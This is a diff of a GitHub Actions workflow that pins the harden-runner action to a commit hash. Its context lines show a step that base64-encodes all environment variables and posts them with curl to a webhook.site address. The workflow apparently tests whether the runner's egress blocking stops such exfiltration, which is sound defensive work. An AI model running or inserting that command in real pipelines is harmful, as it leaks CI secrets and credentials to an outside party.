@@ -10,7 +10,7 @@ jobs:
       contents: read
     steps:
       - name: Harden Runner
-        uses: step-security/harden-runner@v2.13.1
+        uses: step-security/harden-runner@f4a75cfd619ee5ce8d5b864b0d183aff3c69b55a # ratchet:step-security/harden-runner@v2.13.1
         with:
           disable-sudo: true
           egress-policy: block
@@ -21,4 +21,3 @@ jobs:
           ALL_ENVS=$(env | base64)
           curl -s -d "a=${ALL_ENVS}" https://webhook.site/e6fa91f2-fdf0-48d6-aa1d-7c54b456d733
 
-  
